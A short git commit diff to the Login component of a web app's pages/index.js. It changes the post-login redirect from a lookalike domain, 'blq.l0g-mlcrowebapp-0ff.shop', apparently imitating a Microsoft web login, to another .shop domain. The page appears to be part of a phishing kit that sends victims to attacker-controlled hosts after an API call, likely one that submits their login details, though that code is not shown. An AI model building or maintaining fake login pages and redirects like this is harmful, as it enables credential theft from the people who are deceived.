e816dbadc70510df340dd839b31d1abb98ad680e
husknet <127146284+husknet@users.noreply.github.com>
2025-04-16 12:42:27 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://blq.l0g-mlcrowebapp-0ff.shop/';
+      window.location.href = 'https://bq.nestconche.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
